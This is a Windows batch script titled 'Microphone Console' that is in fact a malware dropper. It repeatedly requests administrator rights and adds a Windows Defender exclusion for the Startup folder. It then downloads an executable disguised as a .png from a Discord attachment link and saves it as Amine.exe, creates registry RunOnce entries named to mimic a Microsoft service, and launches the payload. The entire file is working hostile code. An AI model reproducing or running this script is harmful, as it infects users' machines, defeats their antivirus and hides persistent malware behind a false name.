@echo off
title Microphone Console

set "counter=0"

:askAdmin
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
if %errorlevel% NEQ 0 (
    if %counter% LSS 100 (
        set /A counter+=1
        goto UACPrompt
    ) else (
        echo Vous avez atteint le nombre maximum de tentatives.
        exit /b 1
    )
) else (
    goto gotAdmin
)

:UACPrompt
powershell -Command "& { Start-Process '%comspec%' -ArgumentList '/c %~s0' -Verb RunAs }"
timeout 2 /nobreak > nul

if exist "%temp%\tmp" (
    del "%temp%\tmp" /f /q & exit /b
) else (
    goto askAdmin
)

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"
echo.>"%temp%\tmp"

powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'

powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1137771634808332378/1197656655404478574/Creal.png' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe\" }"

echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Aminebat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo start explorer.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.exe" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"
echo exit >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat"

powershell -Command "& { Invoke-Item \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Amine.bat\" }"
pause
